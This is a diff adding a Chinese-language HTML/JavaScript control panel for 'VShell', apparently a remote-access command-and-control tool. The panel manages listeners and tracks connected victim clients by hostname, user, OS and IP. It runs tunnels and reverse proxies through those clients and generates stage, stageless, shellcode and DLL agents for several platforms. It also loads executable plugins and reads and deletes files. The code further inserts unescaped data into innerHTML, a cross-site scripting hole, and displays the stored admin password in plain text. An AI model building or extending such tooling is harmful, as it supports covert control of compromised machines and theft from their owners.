@@ -1,0 +1,523 @@
+<!DOCTYPE html>
+<html lang="zh">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>VShell 管理平台</title>
+<style>
+:root{--bg:#0f1419;--bg2:#1a1f2e;--bg3:#242b3d;--border:#2a3344;--text:#e0e6ed;--text2:#8b95a5;--accent:#4f8ff7;--green:#34d399;--red:#f87171;--yellow:#fbbf24;--radius:6px}
+*{margin:0;padding:0;box-sizing:border-box}
+body{background:var(--bg);color:var(--text);font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',sans-serif;display:flex;min-height:100vh}
+#login-page{display:flex;align-items:center;justify-content:center;width:100vw;height:100vh;background:var(--bg)}
+.login-box{background:var(--bg2);padding:40px;border-radius:12px;width:380px;border:1px solid var(--border)}
+.login-box h1{text-align:center;margin-bottom:30px;font-size:24px}
+.login-box input{width:100%;padding:12px;margin-bottom:15px;background:var(--bg3);border:1px solid var(--border);border-radius:var(--radius);color:var(--text);font-size:14px;outline:none}
+.login-box input:focus{border-color:var(--accent)}
+.login-box button{width:100%;padding:12px;background:var(--accent);border:none;border-radius:var(--radius);color:#fff;font-size:14px;cursor:pointer;font-weight:600}
+.login-box button:hover{opacity:.9}
+.login-box .err{color:var(--red);text-align:center;margin-top:10px;font-size:13px}
+
+#app{display:none;width:100%}
+#app.active,#login-page.active{display:flex}
+
+.sidebar{width:220px;background:var(--bg2);border-right:1px solid var(--border);padding:20px 0;flex-shrink:0}
+.sidebar .logo{padding:0 20px 20px;font-size:18px;font-weight:700;border-bottom:1px solid var(--border);margin-bottom:10px}
+.sidebar nav a{display:block;padding:10px 20px;color:var(--text2);text-decoration:none;font-size:14px;cursor:pointer;transition:.2s}
+.sidebar nav a:hover,.sidebar nav a.active{color:var(--text);background:var(--bg3)}
+.sidebar .user{padding:15px 20px;border-top:1px solid var(--border);margin-top:auto;font-size:13px;color:var(--text2);position:absolute;bottom:0;width:220px}
+.sidebar .user button{background:var(--red);border:none;color:#fff;padding:4px 12px;border-radius:4px;cursor:pointer;font-size:12px;float:right}
+
+.main{flex:1;overflow-y:auto;padding:20px 30px}
+.main h2{font-size:20px;margin-bottom:20px}
+.stats{display:grid;grid-template-columns:repeat(4,1fr);gap:15px;margin-bottom:25px}
+.stat-card{background:var(--bg2);padding:20px;border-radius:var(--radius);border:1px solid var(--border)}
+.stat-card .num{font-size:32px;font-weight:700;margin-bottom:5px}
+.stat-card .label{color:var(--text2);font-size:13px}
+.stat-card.green .num{color:var(--green)}
+.stat-card.blue .num{color:var(--accent)}
+
+.panel{background:var(--bg2);border:1px solid var(--border);border-radius:var(--radius);padding:20px;margin-bottom:20px}
+.panel h3{font-size:16px;margin-bottom:15px;color:var(--text2)}
+table{width:100%;border-collapse:collapse}
+th,td{padding:10px 12px;text-align:left;border-bottom:1px solid var(--border);font-size:13px}
+th{color:var(--text2);font-weight:600}
+tr:hover{background:var(--bg3)}
+.badge{padding:2px 8px;border-radius:10px;font-size:11px;font-weight:600}
+.badge.online{background:#065f4620;color:var(--green)}
+.badge.offline{background:#7f1d1d20;color:var(--red)}
+.badge.http{background:#1e3a5f20;color:var(--accent)}
+
+.btn{padding:6px 14px;border-radius:var(--radius);font-size:12px;cursor:pointer;border:none;font-weight:600;margin-right:4px}
+.btn-primary{background:var(--accent);color:#fff}
+.btn-danger{background:var(--red);color:#fff}
+.btn-green{background:var(--green);color:#000}
+.btn-sm{padding:3px 8px;font-size:11px}
+
+.form-group{margin-bottom:15px}
+.form-group label{display:block;color:var(--text2);font-size:13px;margin-bottom:5px}
+.form-group input,.form-group select{width:100%;padding:10px;background:var(--bg3);border:1px solid var(--border);border-radius:var(--radius);color:var(--text);font-size:13px;outline:none}
+.form-group input:focus{border-color:var(--accent)}
+.form-row{display:grid;grid-template-columns:1fr 1fr;gap:15px}
+
+.toast{position:fixed;top:20px;right:20px;padding:12px 20px;border-radius:var(--radius);color:#fff;font-size:13px;z-index:999;animation:slide .3s}
+.toast.success{background:#065f46}
+.toast.error{background:#7f1d1d}
+@keyframes slide{from{transform:translateX(100%)}to{transform:translateX(0)}}
+
+.empty{text-align:center;padding:40px;color:var(--text2)}
+.loading{text-align:center;padding:40px;color:var(--text2)}
+.modal-overlay{position:fixed;top:0;left:0;width:100%;height:100%;background:#00000080;display:flex;align-items:center;justify-content:center;z-index:100}
+.modal{background:var(--bg2);border:1px solid var(--border);border-radius:12px;padding:25px;width:480px;max-height:80vh;overflow-y:auto}
+.modal h3{margin-bottom:15px}
+.hidden{display:none!important}
+</style>
+</head>
+<body>
+
+<div id="login-page" class="active">
+  <div class="login-box">
+    <h1>🔐 VShell 管理平台</h1>
+    <input id="login-user" placeholder="账号" value="admin">
+    <input id="login-pass" type="password" placeholder="密码">
+    <button onclick="doLogin()">登 录</button>
+    <div class="err" id="login-err"></div>
+  </div>
+</div>
+
+<div id="app">
+  <div class="sidebar">
+    <div class="logo">⚡ VShell</div>
+    <nav>
+      <a data-page="dashboard" class="active" onclick="navTo('dashboard')">📊 仪表盘</a>
+      <a data-page="listeners" onclick="navTo('listeners')">📡 监听管理</a>
+      <a data-page="clients" onclick="navTo('clients')">💻 客户端</a>
+      <a data-page="tunnels" onclick="navTo('tunnels')">🔗 隧道代理</a>
+      <a data-page="hosts" onclick="navTo('hosts')">🌐 反向代理</a>
+      <a data-page="downloads" onclick="navTo('downloads')">📦 客户端生成</a>
+      <a data-page="plugins" onclick="navTo('plugins')">🧩 插件管理</a>
+      <a data-page="files" onclick="navTo('files')">📁 文件管理</a>
+      <a data-page="settings" onclick="navTo('settings')">⚙️ 系统设置</a>
+    </nav>
+    <div class="user"><span id="nav-user">admin</span><button onclick="doLogout()">退出</button></div>
+  </div>
+  <div class="main" id="main-content"></div>
+</div>
+
+<div class="modal-overlay hidden" id="modal-overlay" onclick="if(event.target===this)closeModal()">
+  <div class="modal" id="modal-content"></div>
+</div>
+
+<script>
+// ========== API Client ==========
+const API = '/api';
+let TOKEN = localStorage.getItem('vshell_token') || '';
+
+async function api(path, opts={}) {
+  const headers = {'Content-Type':'application/json'};
+  if(TOKEN) headers['X-Token'] = TOKEN;
+  const res = await fetch(API+path, {headers, ...opts});
+  return res.json();
+}
+
+async function doLogin() {
+  const u = document.getElementById('login-user').value;
+  const p = document.getElementById('login-pass').value;
+  try {
+    const r = await fetch(API+'/login', {
+      method:'POST', headers:{'Content-Type':'application/json'},
+      body: JSON.stringify({username:u, password:p})
+    });
+    const data = await r.json();
+    if(data.code===0 && data.result?.token) {
+      TOKEN = data.result.token;
+      localStorage.setItem('vshell_token', TOKEN);
+      document.getElementById('login-page').classList.remove('active');
+      document.getElementById('app').classList.add('active');
+      document.getElementById('nav-user').textContent = u;
+      navTo('dashboard');
+    } else {
+      document.getElementById('login-err').textContent = data.message || '登录失败';
+    }
+  } catch(e) {
+    document.getElementById('login-err').textContent = '连接失败: '+e.message;
+  }
+}
+
+function doLogout() {
+  TOKEN = ''; localStorage.removeItem('vshell_token');
+  document.getElementById('app').classList.remove('active');
+  document.getElementById('login-page').classList.add('active');
+}
+
+// Auto-login
+if(TOKEN) {
+  api('/getUserInfo').then(r => {
+    if(r.code===0) {
+      document.getElementById('login-page').classList.remove('active');
+      document.getElementById('app').classList.add('active');
+      document.getElementById('nav-user').textContent = r.result?.username || 'admin';
+      navTo('dashboard');
+    } else { TOKEN=''; localStorage.removeItem('vshell_token'); }
+  }).catch(() => { TOKEN=''; localStorage.removeItem('vshell_token'); });
+}
+
+function toast(msg, type='success') {
+  const t = document.createElement('div');
+  t.className = 'toast '+type; t.textContent = msg;
+  document.body.appendChild(t);
+  setTimeout(() => t.remove(), 3000);
+}
+
+function navTo(page) {
+  document.querySelectorAll('.sidebar nav a').forEach(a => a.classList.remove('active'));
+  document.querySelector(`[data-page="${page}"]`)?.classList.add('active');
+  const renderers = {dashboard:renderDashboard,listeners:renderListeners,clients:renderClients,
+    tunnels:renderTunnels,hosts:renderHosts,downloads:renderDownloads,plugins:renderPlugins,
+    files:renderFiles,settings:renderSettings};
+  const fn = renderers[page];
+  if(fn) fn();
+}
+
+// ========== Dashboard ==========
+async function renderDashboard() {
+  const m = document.getElementById('main-content');
+  m.innerHTML = '<h2>📊 仪表盘</h2><div class="loading">加载中...</div>';
+  try {
+    const [listeners, clients, tunnels, hosts, settings] = await Promise.all([
+      api('/listener/list', {method:'POST', body:'{"page":1,"pageSize":1}'}),
+      api('/client/list', {method:'POST', body:'{"page":1,"pageSize":1}'}),
+      api('/tunnel/list', {method:'POST', body:'{"page":1,"pageSize":1}'}),
+      api('/host/list', {method:'POST', body:'{"page":1,"pageSize":1}'}),
+      api('/setting/get')
+    ]);
+    const lTotal = listeners.result?.total || 0;
+    const cTotal = clients.result?.total || 0;
+    const tTotal = tunnels.result?.total || 0;
+    const hTotal = hosts.result?.total || 0;
+    const s = settings.result || {};
+    m.innerHTML = `
+      <h2>📊 仪表盘</h2>
+      <div class="stats">
+        <div class="stat-card green"><div class="num">${cTotal}</div><div class="label">客户端总数</div></div>
+        <div class="stat-card blue"><div class="num">${lTotal}</div><div class="label">监听总数</div></div>
+        <div class="stat-card"><div class="num">${tTotal}</div><div class="label">活跃隧道</div></div>
+        <div class="stat-card"><div class="num">${hTotal}</div><div class="label">反向代理</div></div>
+      </div>
+      <div style="display:grid;grid-template-columns:1fr 1fr;gap:15px">
+        <div class="panel"><h3>系统信息</h3>
+          <table><tr><td>标题</td><td>${s.web_title||'-'}</td></tr>
+          <tr><td>端口</td><td>${s.web_port||'-'}</td></tr>
+          <tr><td>用户名</td><td>${s.web_username||'-'}</td></tr>
+          <tr><td>模式</td><td>${s.master_type||'web'}</td></tr></table>
+        </div>
+        <div class="panel"><h3>日志 & 授权</h3>
+          <table><tr><td>日志级别</td><td>${s.log_level||7}</td></tr>
+          <tr><td>日志路径</td><td>${s.log_path||'默认'}</td></tr>
+          <tr><td>SSL</td><td>${s.web_open_ssl?'✅':'❌'}</td></tr>
+          <tr><td>Basic认证</td><td>${s.web_basic_auth?'✅':'❌'}</td></tr></table>
+        </div>
+      </div>`;
+  } catch(e) { m.innerHTML = '<h2>📊 仪表盘</h2><div class="empty">加载失败: '+e.message+'</div>'; }
+}
+
+// ========== Listeners ==========
+async function renderListeners() {
+  const m = document.getElementById('main-content');
+  m.innerHTML = '<h2>📡 监听管理</h2><div class="loading">加载中...</div>';
+  try {
+    const r = await api('/listener/list', {method:'POST', body:'{"page":1,"pageSize":100}'});
+    const items = r.result?.items || [];
+    m.innerHTML = `<h2>📡 监听管理</h2>
+      <button class="btn btn-primary" onclick="showListenerForm()">+ 新建监听</button>
+      <div class="panel" style="margin-top:15px">
+        <table><thead><tr><th>ID</th><th>地址</th><th>模式</th><th>备注</th><th>状态</th><th>操作</th></tr></thead>
+        <tbody>${items.map(l => `<tr>
+          <td>${l.id}</td><td>${l.listen_addr}</td>
+          <td><span class="badge http">${l.mode}</span></td>
+          <td>${l.remark||'-'}</td>
+          <td><span class="badge ${l.status?'online':'offline'}">${l.status?'运行':'停止'}</span></td>
+          <td>
+            <button class="btn btn-green btn-sm" onclick="startListener(${l.id})">启动</button>
+            <button class="btn btn-sm btn-danger" onclick="stopListener(${l.id})">停止</button>
+            <button class="btn btn-sm btn-danger" onclick="delListener(${l.id})">删除</button>
+          </td></tr>`).join('')}</tbody></table>
+        ${items.length===0?'<div class="empty">暂无监听</div>':''}
+      </div>`;
+  } catch(e) { m.innerHTML = '<h2>📡 监听管理</h2><div class="empty">加载失败</div>'; }
+}
+
+function showListenerForm() {
+  document.getElementById('modal-overlay').classList.remove('hidden');
+  document.getElementById('modal-content').innerHTML = `
+    <h3>新建监听</h3>
+    <div class="form-group"><label>监听地址</label><input id="lf-addr" value="0.0.0.0:443"></div>
+    <div class="form-row">
+      <div class="form-group"><label>模式</label><select id="lf-mode"><option>http</option><option>https</option><option>dns</option></select></div>
+      <div class="form-group"><label>验证密钥</label><input id="lf-vkey" placeholder="可选"></div>
+    </div>
+    <div class="form-group"><label>备注</label><input id="lf-remark" placeholder="可选"></div>
+    <button class="btn btn-primary" onclick="createListener()">创建</button>
+    <button class="btn" onclick="closeModal()">取消</button>`;
+}
+
+async function createListener() {
+  const addr = document.getElementById('lf-addr').value;
+  const mode = document.getElementById('lf-mode').value;
+  const vkey = document.getElementById('lf-vkey').value;
+  const remark = document.getElementById('lf-remark').value;
+  try {
+    await api('/listener/add', {method:'POST', body:JSON.stringify({listen_addr:addr,mode,vkey,remark})});
+    closeModal(); toast('监听创建成功'); renderListeners();
+  } catch(e) { toast('创建失败: '+e.message, 'error'); }
+}
+
+async function startListener(id) {
+  await api('/listener/start', {method:'POST', body:JSON.stringify({id})});
+  toast('已启动'); renderListeners();
+}
+async function stopListener(id) {
+  await api('/listener/stop', {method:'POST', body:JSON.stringify({id})});
+  toast('已停止'); renderListeners();
+}
+async function delListener(id) {
+  if(!confirm('确认删除监听 '+id+' ?')) return;
+  await api('/listener/del', {method:'POST', body:JSON.stringify({id})});
+  toast('已删除'); renderListeners();
+}
+
+function closeModal() { document.getElementById('modal-overlay').classList.add('hidden'); }
+
+// ========== Clients ==========
+async function renderClients() {
+  const m = document.getElementById('main-content');
+  m.innerHTML = '<h2>💻 客户端管理</h2><div class="loading">加载中...</div>';
+  try {
+    const r = await api('/client/list', {method:'POST', body:'{"page":1,"pageSize":100}'});
+    const items = r.result?.items || [];
+    m.innerHTML = `<h2>💻 客户端管理</h2>
+      <div class="panel"><table><thead><tr><th>ID</th><th>主机名</th><th>用户</th><th>OS</th><th>IP</th><th>类型</th><th>在线</th><th>操作</th></tr></thead>
+        <tbody>${items.map(c => `<tr>
+          <td>${c.id}</td><td>${c.host_name||'-'}</td><td>${c.user_name||'-'}</td><td>${c.os_name||'-'}</td>
+          <td>${c.local_ip||c.addr||'-'}</td><td><span class="badge http">${c.type||'http'}</span></td>
+          <td><span class="badge ${c.is_connect?'online':'offline'}">${c.is_connect?'在线':'离线'}</span></td>
+          <td><button class="btn btn-sm btn-danger" onclick="delClient(${c.id})">删除</button></td>
+        </tr>`).join('')}</tbody></table>
+        ${items.length===0?'<div class="empty">暂无客户端</div>':''}</div>`;
+  } catch(e) { m.innerHTML = '<h2>💻 客户端管理</h2><div class="empty">加载失败</div>'; }
+}
+async function delClient(id) {
+  if(!confirm('确认删除客户端 '+id+' ?')) return;
+  await api('/client/dellist', {method:'POST', body:JSON.stringify({ids:[id]})});
+  toast('已删除'); renderClients();
+}
+
+// ========== Tunnels ==========
+async function renderTunnels() {
+  const m = document.getElementById('main-content');
+  m.innerHTML = '<h2>🔗 隧道代理</h2><div class="loading">加载中...</div>';
+  try {
+    const r = await api('/tunnel/list', {method:'POST', body:'{"page":1,"pageSize":100}'});
+    const items = r.result?.items || [];
+    m.innerHTML = `<h2>🔗 隧道代理</h2>
+      <div class="panel"><table><thead><tr><th>ID</th><th>端口</th><th>模式</th><th>客户端</th><th>目标</th><th>状态</th><th>操作</th></tr></thead>
+        <tbody>${items.map(t => `<tr>
+          <td>${t.id}</td><td>${t.port}</td><td>${t.mode}</td><td>${t.client_id}</td><td>${t.target_addr||'-'}</td>
+          <td><span class="badge ${t.run_status?'online':'offline'}">${t.run_status?'运行':'停止'}</span></td>
+          <td>
+            <button class="btn btn-green btn-sm" onclick="toggleTunnel(${t.id},true)">启动</button>
+            <button class="btn btn-sm btn-danger" onclick="toggleTunnel(${t.id},false)">停止</button>
+            <button class="btn btn-sm btn-danger" onclick="delTunnel(${t.id})">删除</button>
+          </td></tr>`).join('')}</tbody></table>
+        ${items.length===0?'<div class="empty">暂无隧道</div>':''}</div>`;
+  } catch(e) { m.innerHTML = '<h2>🔗 隧道代理</h2><div class="empty">加载失败</div>'; }
+}
+async function toggleTunnel(id, start) {
+  await api('/tunnel/'+(start?'start':'stop'), {method:'POST', body:JSON.stringify({id})});
+  toast(start?'已启动':'已停止'); renderTunnels();
+}
+async function delTunnel(id) {
+  if(!confirm('确认删除?')) return;
+  await api('/tunnel/del', {method:'POST', body:JSON.stringify({id})});
+  toast('已删除'); renderTunnels();
+}
+
+// ========== Hosts ==========
+async function renderHosts() {
+  const m = document.getElementById('main-content');
+  m.innerHTML = '<h2>🌐 反向代理</h2><div class="loading">加载中...</div>';
+  try {
+    const r = await api('/host/list', {method:'POST', body:'{"page":1,"pageSize":100}'});
+    const items = r.result?.items || [];
+    m.innerHTML = `<h2>🌐 反向代理</h2>
+      <button class="btn btn-primary" onclick="showHostForm()">+ 新建</button>
+      <div class="panel" style="margin-top:15px"><table><thead><tr><th>ID</th><th>域名</th><th>协议</th><th>目标</th><th>客户端</th><th>操作</th></tr></thead>
+        <tbody>${items.map(h => `<tr>
+          <td>${h.id}</td><td>${h.host||'-'}</td><td>${h.scheme||'http'}</td><td>${h.target_str||'-'}</td><td>${h.client_id}</td>
+          <td>
+            <button class="btn btn-green btn-sm" onclick="toggleHost(${h.id},true)">启动</button>
+            <button class="btn btn-sm btn-danger" onclick="toggleHost(${h.id},false)">停止</button>
+            <button class="btn btn-sm btn-danger" onclick="delHost(${h.id})">删除</button>
+          </td></tr>`).join('')}</tbody></table>
+        ${items.length===0?'<div class="empty">暂无反向代理</div>':''}</div>`;
+  } catch(e) { m.innerHTML = '<h2>🌐 反向代理</h2><div class="empty">加载失败</div>'; }
+}
+function showHostForm() {
+  document.getElementById('modal-overlay').classList.remove('hidden');
+  document.getElementById('modal-content').innerHTML = `
+    <h3>新建反向代理</h3>
+    <div class="form-group"><label>域名</label><input id="hf-host" placeholder="example.com"></div>
+    <div class="form-row">
+      <div class="form-group"><label>协议</label><select id="hf-scheme"><option>http</option><option>https</option></select></div>
+      <div class="form-group"><label>客户端ID</label><input id="hf-cid" type="number" value="1"></div>
+    </div>
+    <div class="form-group"><label>目标地址</label><input id="hf-target" placeholder="http://10.0.0.1:8080"></div>
+    <button class="btn btn-primary" onclick="createHost()">创建</button>
+    <button class="btn" onclick="closeModal()">取消</button>`;
+}
+async function createHost() {
+  const host = document.getElementById('hf-host').value;
+  const scheme = document.getElementById('hf-scheme').value;
+  const cid = document.getElementById('hf-cid').value;
+  const target = document.getElementById('hf-target').value;
+  await api('/host/add', {method:'POST', body:JSON.stringify({client_id:parseInt(cid),host,target_str:target,scheme})});
+  closeModal(); toast('创建成功'); renderHosts();
+}
+async function toggleHost(id, start) {
+  await api('/host/'+(start?'start':'stop'), {method:'POST', body:JSON.stringify({id})});
+  toast(start?'已启动':'已停止'); renderHosts();
+}
+async function delHost(id) {
+  if(!confirm('确认删除?')) return;
+  await api('/host/del', {method:'POST', body:JSON.stringify({id})});
+  toast('已删除'); renderHosts();
+}
+
+// ========== Downloads ==========
+async function renderDownloads() {
+  document.getElementById('main-content').innerHTML = `<h2>📦 客户端生成</h2>
+    <div class="panel"><h3>生成Agent</h3>
+      <div class="form-row">
+        <div class="form-group"><label>平台</label><select id="dl-platform"><option>windows</option><option>linux</option><option>darwin</option></select></div>
+        <div class="form-group"><label>架构</label><select id="dl-arch"><option>amd64</option><option>386</option><option>arm64</option></select></div>
+      </div>
+      <div class="form-row">
+        <div class="form-group"><label>类型</label><select id="dl-type"><option value="stage">Stage (分阶段)</option><option value="stageless">Stageless (完整)</option><option value="shellcode">Shellcode</option><option value="dll">DLL</option><option value="listen">Listen模式</option><option value="listen_dll">Listen DLL</option></select></div>
+        <div class="form-group"><label>监听地址</label><input id="dl-addr" value="127.0.0.1:443"></div>
+      </div>
+      <button class="btn btn-primary" onclick="generateAgent()">生成下载</button>
+      <div id="dl-result" style="margin-top:15px"></div>
+    </div>`;
+}
+async function generateAgent() {
+  const platform = document.getElementById('dl-platform').value;
+  const arch = document.getElementById('dl-arch').value;
+  const type = document.getElementById('dl-type').value;
+  const addr = document.getElementById('dl-addr').value;
+  const dlDiv = document.getElementById('dl-result');
+  dlDiv.innerHTML = '<div class="loading">生成中...</div>';
+  try {
+    const r = await api('/download/'+type, {method:'POST', body:JSON.stringify({platform,arch,server_addr:addr})});
+    dlDiv.innerHTML = `<span style="color:var(--green)">✅ 生成成功</span> <a href="/api/download/${type}" target="_blank">下载 agent_${platform}_${arch}</a>`;
+  } catch(e) { dlDiv.innerHTML = `<span style="color:var(--red)">❌ 生成失败: ${e.message}</span>`; }
+}
+
+// ========== Plugins ==========
+async function renderPlugins() {
+  const m = document.getElementById('main-content');
+  m.innerHTML = '<h2>🧩 插件管理</h2><div class="loading">加载中...</div>';
+  try {
+    const r = await api('/plugins');
+    const items = Array.isArray(r.result) ? r.result : (r.result?.items || []);
+    m.innerHTML = `<h2>🧩 插件管理</h2>
+      <div class="panel"><table><thead><tr><th>名称</th><th>类型</th><th>大小</th><th>描述</th></tr></thead>
+        <tbody>${items.map(p => `<tr><td>${p.name}</td><td>${p.type}</td><td>${(p.size/1024).toFixed(1)}KB</td><td>${p.description||'-'}</td></tr>`).join('')}</tbody></table>
+        ${items.length===0?'<div class="empty">暂无插件（将 .exe/.dll/.elf 放入 plugins/ 目录）</div>':''}</div>`;
+  } catch(e) { m.innerHTML = '<h2>🧩 插件管理</h2><div class="empty">加载失败</div>'; }
+}
+
+// ========== Files ==========
+async function renderFiles() {
+  const m = document.getElementById('main-content');
+  m.innerHTML = `<h2>📁 文件管理</h2>
+    <div class="form-row"><div class="form-group"><label>路径</label><input id="file-path" value="." onchange="renderFiles()"></div></div>
+    <div id="file-list" class="loading">加载中...</div>`;
+  loadFiles('.');
+}
+async function loadFiles(path) {
+  document.getElementById('file-path').value = path;
+  const listDiv = document.getElementById('file-list');
+  try {
+    const r = await api('/file/ls?path='+encodeURIComponent(path));
+    const items = r.result?.items || r.result || [];
+    const files = Array.isArray(items) ? items : [];
+    listDiv.innerHTML = `<div class="panel"><table><thead><tr><th>名称</th><th>类型</th><th>大小</th><th>操作</th></tr></thead>
+      <tbody>${files.map(f => `<tr>
+        <td style="cursor:pointer" onclick="${f.is_dir?`loadFiles('${path}/${f.name}'.replace('//','/'))`:'catFile(\''+path+'/'+f.name+'\')'}">${f.is_dir?'📁':'📄'} ${f.name}</td>
+        <td>${f.is_dir?'目录':'文件'}</td><td>${f.size} bytes</td>
+        <td><button class="btn btn-sm btn-danger" onclick="rmFile('${path}/${f.name}')">删除</button></td>
+      </tr>`).join('')}</tbody></table>
+      ${files.length===0?'<div class="empty">空目录</div>':''}</div>
+      <button class="btn btn-green" onclick="showMkdir()">+ 新建目录</button>`;
+  } catch(e) { listDiv.innerHTML = '<div class="empty">加载失败</div>'; }
+}
+async function catFile(path) {
+  try {
+    const r = await api('/file/cat?path='+encodeURIComponent(path), {method:'POST'});
+    alert(r.result?.output || r.result || '读取失败');
+  } catch(e) { toast('读取失败', 'error'); }
+}
+async function rmFile(path) {
+  if(!confirm('删除 '+path+' ?')) return;
+  await api('/file/rm?path='+encodeURIComponent(path), {method:'POST'});
+  toast('已删除'); loadFiles(document.getElementById('file-path').value);
+}
+function showMkdir() {
+  const name = prompt('目录名称:');
+  if(name) { api('/file/mkdir?path='+encodeURIComponent(name), {method:'POST'}).then(() => { toast('已创建'); loadFiles('.'); }); }
+}
+
+// ========== Settings ==========
+async function renderSettings() {
+  const m = document.getElementById('main-content');
+  m.innerHTML = '<h2>⚙️ 系统设置</h2><div class="loading">加载中...</div>';
+  try {
+    const r = await api('/setting/get');
+    const s = r.result || {};
+    m.innerHTML = `<h2>⚙️ 系统设置</h2>
+      <div class="panel"><h3>Web面板</h3>
+        <div class="form-row">
+          <div class="form-group"><label>标题</label><input id="set-title" value="${s.web_title||''}"></div>
+          <div class="form-group"><label>端口</label><input id="set-port" type="number" value="${s.web_port||8082}"></div>
+        </div>
+        <div class="form-row">
+          <div class="form-group"><label>用户名</label><input id="set-user" value="${s.web_username||'admin'}"></div>
+          <div class="form-group"><label>密码</label><input id="set-pass" value="${s.web_password||''}"></div>
+        </div>
+      </div>
+      <div class="panel"><h3>通知</h3>
+        <div class="form-group"><label>钉钉 Token</label><input id="set-dd" value="${s.dingding_access_token||''}"></div>
+        <div class="form-group"><label>微信 Key</label><input id="set-wx" value="${s.wx_key||''}"></div>
+      </div>
+      <button class="btn btn-primary" onclick="saveSettings()">保存设置</button>
+      <span id="set-msg" style="margin-left:10px;font-size:13px"></span>`;
+  } catch(e) { m.innerHTML = '<h2>⚙️ 系统设置</h2><div class="empty">加载失败</div>'; }
+}
+async function saveSettings() {
+  const data = {
+    web_title: document.getElementById('set-title').value,
+    web_port: parseInt(document.getElementById('set-port').value)||8082,
+    web_username: document.getElementById('set-user').value,
+    web_password: document.getElementById('set-pass').value,
+    dingding_access_token: document.getElementById('set-dd').value,
+    wx_key: document.getElementById('set-wx').value
+  };
+  try {
+    await api('/settings', {method:'POST', body:JSON.stringify(data)});
+    document.getElementById('set-msg').innerHTML = '<span style="color:var(--green)">✅ 保存成功</span>';
+  } catch(e) {
+    document.getElementById('set-msg').innerHTML = '<span style="color:var(--red)">❌ 保存失败</span>';
+  }
+}
+</script>
+</body>
+</html>
